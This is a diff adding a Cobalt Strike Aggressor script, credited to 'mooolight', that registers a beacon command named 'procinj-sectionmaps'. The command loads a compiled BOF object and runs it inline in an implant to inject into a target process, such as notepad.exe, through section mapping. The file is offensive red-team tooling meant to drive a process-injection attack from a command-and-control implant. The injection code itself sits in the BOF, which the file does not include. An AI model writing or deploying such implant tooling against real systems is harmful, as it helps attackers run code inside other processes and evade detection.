@@ -1,0 +1,25 @@
+# author mooolight
+
+beacon_command_register(
+	"procinj-sectionmaps", "This exploit requires necessary access privilege of the implant to inject onto the target process.",
+	"INFO:\targetProcName: This is the process name to inject to. It is expected that the RTO must enumerate the processes in the target system.\n\n".
+	"ARGUMENTS:\n[<targetProcName>]: specify whether the specific name of the process to inject to.\n\n\n".
+	"USAGE:\nprocinj-sectionmaps <targetProcName>\n\n".
+	"EXAMPLES:\nprocinj-sectionmaps notepad.exe\n\n");
+	
+alias procinj-sectionmaps {
+    $bid = $1;
+	$targetProcName = $2;
+	
+    # Read in the right BOF file
+    $handle = openf(script_resource("procinj-sectionmaps-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid,"z",$targetProcName);
+
+    blog($bid, "Tasked to inject into a target process via Section Maps...");
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
